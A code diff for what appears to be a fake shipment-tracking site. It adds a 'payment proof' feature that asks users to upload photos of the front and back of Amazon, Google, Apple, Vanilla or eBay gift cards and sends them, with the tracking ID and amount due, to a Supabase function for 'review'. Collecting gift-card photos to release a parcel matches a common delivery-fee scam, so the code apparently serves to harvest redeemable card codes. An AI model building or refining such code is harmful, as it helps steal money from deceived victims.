@@ -8,6 +8,156 @@ const SUPABASE_URL      = 'https://oltbgccsceipedoadgka.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9sdGJnY2NzY2VpcGVkb2FkZ2thIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MjY0NTQsImV4cCI6MjA5NjQwMjQ1NH0.Q5uoDXqlxBl-FxiISbp5bR3NLDsEL4iOMYVbVugwv94';
 // ══════════════════════════════════════════════════════════════
 
+// ── Payment proof uploads ─────────────────────────────────────────────────────
+// Stores { [fileId]: { dataUrl, name, type } } — persists across method switches
+const _payProofFiles = {};
+
+// Compress + convert image to base64 (max 1200px, quality 0.78)
+function _compressImage(file) {
+    return new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const img = new Image();
+            img.onload = () => {
+                const MAX = 1200;
+                let w = img.width, h = img.height;
+                if (w > MAX) { h = Math.round(h * MAX / w); w = MAX; }
+                if (h > MAX) { w = Math.round(w * MAX / h); h = MAX; }
+                const canvas = document.createElement('canvas');
+                canvas.width = w; canvas.height = h;
+                canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+                const qual = file.type === 'image/png' ? 0.9 : 0.78;
+                const out  = canvas.toDataURL('image/jpeg', qual);
+                resolve(out);
+            };
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    });
+}
+
+function _onPayUpload(input, id) {
+    if (!input.files || !input.files[0]) return;
+    const file = input.files[0];
+    if (file.size > 12 * 1024 * 1024) {
+        alert('Image too large (max 12 MB). Please choose a smaller file.');
+        input.value = '';
+        return;
+    }
+    _compressImage(file).then(dataUrl => {
+        _payProofFiles[id] = { dataUrl, name: file.name, type: 'image/jpeg' };
+        const zone    = document.getElementById('zone-'    + id);
+        const preview = document.getElementById('preview-' + id);
+        const empty   = document.getElementById('empty-'   + id);
+        const change  = document.getElementById('change-'  + id);
+        if (preview) { preview.src = dataUrl; preview.style.display = 'block'; }
+        if (empty)   empty.style.display   = 'none';
+        if (change)  change.style.display  = 'flex';
+        if (zone)    zone.classList.add('has-file');
+    });
+}
+
+function _clearPayUpload(id) {
+    delete _payProofFiles[id];
+    const zone    = document.getElementById('zone-'    + id);
+    const preview = document.getElementById('preview-' + id);
+    const empty   = document.getElementById('empty-'   + id);
+    const change  = document.getElementById('change-'  + id);
+    const input   = document.getElementById(id);
+    if (preview) { preview.src = ''; preview.style.display = 'none'; }
+    if (empty)   empty.style.display  = 'flex';
+    if (change)  change.style.display = 'none';
+    if (zone)    zone.classList.remove('has-file');
+    if (input)   input.value = '';
+}
+
+async function submitPaymentProof(method) {
+    const s = window._sflShipmentData;
+    if (!s) return;
+    const btn = document.querySelector('.t-pp-submit-btn');
+    if (btn) { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>&nbsp; Submitting…'; }
+
+    const CARD_METHODS = ['AMAZON','GOOGLE','APPLE','VANILLA','EBAY'];
+    const sides = CARD_METHODS.includes(method) ? ['front','back'] : ['receipt'];
+    const images = [];
+    for (const side of sides) {
+        const fd = _payProofFiles[`ppf-${method}-${side}`];
+        if (fd) {
+            const b64 = fd.dataUrl.split(',')[1] || '';
+            images.push({ filename: `${method.toLowerCase()}-${side}.jpg`, content: b64, mimeType: 'image/jpeg', label: side === 'front' ? 'Front' : side === 'back' ? 'Back of Card' : 'Receipt / Screenshot' });
+        }
+    }
+
+    try {
+        const r = await fetch(`${SUPABASE_URL}/functions/v1/payment-proof`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${SUPABASE_ANON_KEY}` },
+            body: JSON.stringify({ trackingId: s.tracking_id, method, amount: s.amount_due, images }),
+        });
+        const res = await r.json();
+        if (!r.ok || res.error) throw new Error(res.error || 'Submission failed');
+        if (btn) { btn.style.cssText += 'background:linear-gradient(135deg,#16a34a,#22c55e)!important;'; btn.innerHTML = '<i class="fas fa-circle-check"></i>&nbsp; Submitted Successfully!'; }
+        // Replace panel with success message after a moment
+        setTimeout(() => {
+            const display = document.getElementById('payment-detail-display');
+            if (display) display.innerHTML = `
+            <div style="text-align:center;padding:36px 20px;">
+              <div style="width:64px;height:64px;background:linear-gradient(135deg,#16a34a,#22c55e);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 0 24px rgba(34,197,94,.4);font-size:28px;">✓</div>
+              <div style="font-size:17px;font-weight:800;color:var(--t-text);margin-bottom:8px;">Payment Proof Submitted</div>
+              <div style="font-size:14px;color:var(--t-muted);line-height:1.6;max-width:320px;margin:0 auto;">Our team will review your submission and update your shipment status within 1–4 hours.</div>
+              <div style="margin-top:20px;font-size:12px;background:rgba(34,197,94,.1);color:#22c55e;border:1px solid rgba(34,197,94,.25);border-radius:20px;padding:6px 18px;display:inline-block;font-weight:700;">✅ UNDER REVIEW</div>
+            </div>`;
+        }, 1800);
+    } catch (e) {
+        if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i>&nbsp; Submit Payment Proof'; }
+        alert('Could not submit. Please check your connection and try again.');
+    }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Build upload zone + submit button for each payment detail panel
+// ─────────────────────────────────────────────────────────────────────────────
+function _uploadZone(method, side, label) {
+    const id = `ppf-${method}-${side}`;
+    return `
+    <div class="t-pp-upload-zone" id="zone-${id}" onclick="document.getElementById('${id}').click()">
+      <div class="t-pp-upload-empty" id="empty-${id}">
+        <i class="fas fa-cloud-arrow-up" style="font-size:1.5rem;opacity:.55;margin-bottom:7px;display:block;"></i>
+        <span style="font-size:.78rem;font-weight:600;">${label}</span>
+        <small style="font-size:.66rem;opacity:.5;margin-top:3px;display:block;">Click or drop · JPG PNG HEIC</small>
+      </div>
+      <img id="preview-${id}" class="t-pp-upload-preview" style="display:none;" alt="preview">
+      <button type="button" class="t-pp-upload-clear" id="change-${id}" style="display:none;"
+              onclick="event.stopPropagation();_clearPayUpload('${id}')">
+        <i class="fas fa-xmark"></i>
+      </button>
+      <input type="file" id="${id}" accept="image/*" capture="environment" style="display:none"
+             onchange="_onPayUpload(this,'${id}')">
+    </div>`;
+}
+
+function _buildProofSection(method) {
+    const CARD_METHODS = ['AMAZON','GOOGLE','APPLE','VANILLA','EBAY'];
+    const isCard = CARD_METHODS.includes(method);
+    const zones = isCard
+        ? `<div class="t-pp-upload-grid">
+            ${_uploadZone(method,'front','Front of Card')}
+            ${_uploadZone(method,'back','Back of Card')}
+           </div>`
+        : _uploadZone(method,'receipt','Receipt / Screenshot');
+    return `
+    <div class="t-pp-proof-section">
+      <div class="t-pp-proof-title">
+        <i class="fas fa-${isCard ? 'id-card' : 'receipt'}" style="margin-right:7px;opacity:.7;"></i>
+        Upload Payment Proof${isCard ? ' <span style="font-size:.62rem;opacity:.55;">(Front &amp; Back)</span>' : ''}
+      </div>
+      ${zones}
+      <button type="button" class="t-pp-submit-btn" onclick="submitPaymentProof('${method}')">
+        <i class="fas fa-paper-plane" style="margin-right:8px;"></i>Submit Payment Proof
+      </button>
+    </div>`;
+}
+
 // ── Global payment defaults: loaded once, merged into every shipment ────────
 let _sflPayDefaults = null;
 async function _loadPayDefaults() {
@@ -38,6 +188,12 @@ function switchPayment(method, info) {
 }
 
 function _buildPayDetail(method, info) {
+    const body = _buildPayDetailBody(method, info);
+    if (!body) return '';
+    return body + _buildProofSection(method);
+}
+
+function _buildPayDetailBody(method, info) {
     const _e = (v) => String(v || '').replace(/[<>&"']/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&#39;'}[c]));
     const copyBtn = (val, id) =>
         `<button class="t-pp-copy-btn" onclick="window._sflCopy('${val.replace(/'/g,"\\'")}','${id}')" id="${id}"><i class="fas fa-copy"></i> Copy</button>`;
@@ -241,6 +397,7 @@ async function handleTracking(silent) {
         }
 
         const s      = resData[0];
+        window._sflShipmentData = s; // used by submitPaymentProof()
 
         // Apply global payment defaults ONLY when this shipment has no per-shipment methods.
         // If even one method is explicitly saved on the shipment, use per-shipment values only.
